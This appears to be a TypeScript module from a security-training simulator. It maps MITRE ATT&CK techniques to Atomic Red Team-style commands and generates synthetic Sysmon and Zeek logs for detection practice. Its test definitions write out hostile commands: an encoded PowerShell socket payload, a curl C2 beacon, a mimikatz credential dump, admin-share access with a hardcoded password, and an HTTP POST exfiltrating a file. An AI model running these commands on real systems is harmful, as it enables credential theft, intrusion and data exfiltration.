// Atomic Red Team technique simulator - executes MITRE ATT&CK techniques and generates logs

import type { AttackStage } from '@/lib/attack-chains';
import { generateSysmonEvent, SYSMON_EVENT_IDS } from '@/lib/log-generators/sysmon-generator';
import { generateZeekConnLog, generateZeekHTTPLog, generateZeekDNSLog } from '@/lib/log-generators/zeek-generator';
import type { SIEMEvent } from '@/lib/types';

export interface AtomicTest {
  id: string;
  name: string;
  description: string;
  mitreTechnique: string;
  attackStage: AttackStage;
  executor: {
    name: string;
    command: string;
    elevation_required?: boolean;
  };
  input_arguments?: Record<string, any>;
  dependencies?: Array<{ description: string; prereq_command: string }>;
}

export interface AtomicExecution {
  testId: string;
  technique: string;
  timestamp: string;
  logs: SIEMEvent[];
  artifacts: Array<{ type: string; value: string }>;
  success: boolean;
}

// Common Atomic Red Team tests mapped to MITRE ATT&CK
export const ATOMIC_TESTS: Record<string, AtomicTest> = {
  'T1059.001': {
    id: 'T1059.001-1',
    name: 'PowerShell Encoded Command',
    description: 'Executes a base64 encoded PowerShell command',
    mitreTechnique: 'T1059.001',
    attackStage: 'execution',
    executor: {
      name: 'powershell',
      command: 'powershell.exe -enc #{encoded_command}',
    },
    input_arguments: {
      encoded_command: {
        default: 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQA9ACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwA=',
        description: 'Base64 encoded PowerShell command',
      },
    },
  },
  'T1071.001': {
    id: 'T1071.001-1',
    name: 'Web Protocols C2 Communication',
    description: 'Establishes C2 communication over HTTP/HTTPS',
    mitreTechnique: 'T1071.001',
    attackStage: 'command-and-control',
    executor: {
      name: 'command_prompt',
      command: 'curl #{remote_url}',
    },
    input_arguments: {
      remote_url: {
        default: 'http://185.220.101.0/beacon',
        description: 'C2 server URL',
      },
    },
  },
  'T1003': {
    id: 'T1003-1',
    name: 'OS Credential Dumping',
    description: 'Dumps credentials from memory using mimikatz-like behavior',
    mitreTechnique: 'T1003',
    attackStage: 'credential-access',
    executor: {
      name: 'command_prompt',
      command: '#{tool_path} sekurlsa::logonpasswords',
      elevation_required: true,
    },
    input_arguments: {
      tool_path: {
        default: 'C:\\Windows\\Temp\\mimikatz.exe',
        description: 'Path to credential dumping tool',
      },
    },
  },
  'T1021.002': {
    id: 'T1021.002-1',
    name: 'SMB/Windows Admin Shares',
    description: 'Accesses remote admin shares for lateral movement',
    mitreTechnique: 'T1021.002',
    attackStage: 'lateral-movement',
    executor: {
      name: 'command_prompt',
      command: 'net use \\\\#{remote_host}\\C$ /user:#{username} #{password}',
    },
    input_arguments: {
      remote_host: {
        default: '10.0.1.50',
        description: 'Target host for lateral movement',
      },
      username: {
        default: 'DOMAIN\\admin',
        description: 'Username for authentication',
      },
      password: {
        default: 'Password123!',
        description: 'Password for authentication',
      },
    },
  },
  'T1048': {
    id: 'T1048-1',
    name: 'Exfiltration Over Alternative Protocol',
    description: 'Exfiltrates data over HTTP/HTTPS',
    mitreTechnique: 'T1048',
    attackStage: 'exfiltration',
    executor: {
      name: 'powershell',
      command: 'Invoke-WebRequest -Uri #{remote_url} -Method POST -Body (Get-Content #{file_path})',
    },
    input_arguments: {
      remote_url: {
        default: 'https://185.220.101.0/exfil',
        description: 'Exfiltration endpoint',
      },
      file_path: {
        default: 'C:\\Users\\Documents\\sensitive.txt',
        description: 'File to exfiltrate',
      },
    },
  },
  'T1566.001': {
    id: 'T1566.001-1',
    name: 'Phishing: Spearphishing Attachment',
    description: 'Opens a malicious document that executes code',
    mitreTechnique: 'T1566.001',
    attackStage: 'initial-access',
    executor: {
      name: 'command_prompt',
      command: 'start #{file_path}',
    },
    input_arguments: {
      file_path: {
        default: 'C:\\Users\\Downloads\\malicious_document.doc',
        description: 'Path to malicious document',
      },
    },
  },
};

export function executeAtomicTest(
  techniqueId: string,
  context?: Record<string, any>
): AtomicExecution {
  const test = ATOMIC_TESTS[techniqueId];
  if (!test) {
    throw new Error(`Atomic test not found for technique ${techniqueId}`);
  }

  const timestamp = new Date().toISOString();
  const logs: SIEMEvent[] = [];
  const artifacts: Array<{ type: string; value: string }> = [];

  // Generate logs based on technique
  switch (techniqueId) {
    case 'T1059.001': // PowerShell
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_CREATE, true, {
          ...context,
          processName: 'powershell.exe',
          commandLine: test.executor.command.replace('#{encoded_command}', test.input_arguments?.encoded_command?.default || ''),
        }) as any
      );
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.NETWORK_CONNECT, true, context) as any
      );
      artifacts.push({ type: 'process', value: 'powershell.exe' });
      artifacts.push({ type: 'command', value: test.executor.command });
      break;

    case 'T1071.001': // C2 Communication
      logs.push(
        generateZeekConnLog(true, context) as any
      );
      logs.push(
        generateZeekHTTPLog(true, context) as any
      );
      logs.push(
        generateZeekDNSLog(true, context) as any
      );
      artifacts.push({ type: 'ip', value: '185.220.101.0' });
      artifacts.push({ type: 'domain', value: 'c2-malicious-domain.com' });
      break;

    case 'T1003': // Credential Dumping
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_CREATE, true, {
          ...context,
          processName: 'mimikatz.exe',
          commandLine: test.executor.command,
        }) as any
      );
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_ACCESS, true, context) as any
      );
      artifacts.push({ type: 'process', value: 'mimikatz.exe' });
      artifacts.push({ type: 'file', value: test.input_arguments?.tool_path?.default || '' });
      break;

    case 'T1021.002': // SMB Lateral Movement
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.NETWORK_CONNECT, true, {
          ...context,
          destIP: test.input_arguments?.remote_host?.default || '10.0.1.50',
          destPort: 445,
        }) as any
      );
      artifacts.push({ type: 'ip', value: test.input_arguments?.remote_host?.default || '' });
      artifacts.push({ type: 'user', value: test.input_arguments?.username?.default || '' });
      break;

    case 'T1048': // Exfiltration
      logs.push(
        generateZeekHTTPLog(true, {
          ...context,
          method: 'POST',
          uri: '/exfil',
        }) as any
      );
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.FILE_CREATE, true, {
          ...context,
          filename: test.input_arguments?.file_path?.default || '',
        }) as any
      );
      artifacts.push({ type: 'ip', value: '185.220.101.0' });
      artifacts.push({ type: 'file', value: test.input_arguments?.file_path?.default || '' });
      break;

    case 'T1566.001': // Phishing
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.PROCESS_CREATE, true, {
          ...context,
          processName: 'WINWORD.EXE',
          parentProcess: 'explorer.exe',
        }) as any
      );
      logs.push(
        generateSysmonEvent(SYSMON_EVENT_IDS.FILE_CREATE, true, {
          ...context,
          filename: test.input_arguments?.file_path?.default || '',
        }) as any
      );
      artifacts.push({ type: 'file', value: test.input_arguments?.file_path?.default || '' });
      break;
  }

  return {
    testId: test.id,
    technique: techniqueId,
    timestamp,
    logs,
    artifacts,
    success: true,
  };
}

export function executeAttackChain(
  techniques: string[],
  context?: Record<string, any>
): AtomicExecution[] {
  const executions: AtomicExecution[] = [];
  let currentContext = { ...context };

  for (const technique of techniques) {
    const execution = executeAtomicTest(technique, currentContext);
    executions.push(execution);

    // Update context for next technique (e.g., extracted credentials, new processes)
    if (execution.artifacts.length > 0) {
      execution.artifacts.forEach(artifact => {
        if (artifact.type === 'user') {
          currentContext.username = artifact.value;
        }
        if (artifact.type === 'ip') {
          currentContext.lastIP = artifact.value;
        }
      });
    }

    // Add delay between techniques to simulate realistic attack timeline
    const delay = Math.random() * 300000 + 60000; // 1-6 minutes
    currentContext.timestamp = new Date(Date.now() + delay).toISOString();
  }

  return executions;
}

